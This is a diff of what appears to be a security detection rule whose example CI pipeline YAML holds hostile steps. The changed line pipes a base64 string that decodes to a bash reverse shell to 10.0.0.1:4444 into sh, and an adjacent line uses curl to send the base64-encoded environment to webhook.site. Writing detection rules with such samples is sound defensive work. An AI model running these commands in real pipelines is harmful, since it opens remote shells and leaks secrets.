@@ -46,7 +46,7 @@ RULE = Rule(
         "  default:\n"
         "    - step:\n"
         "        script:\n"
-        "          - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "          - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
         "          - curl https://webhook.site/abc?env=$(env|base64)\n"
         "\n"
         "# Safe: the pipeline does only what the pipeline does.\n"
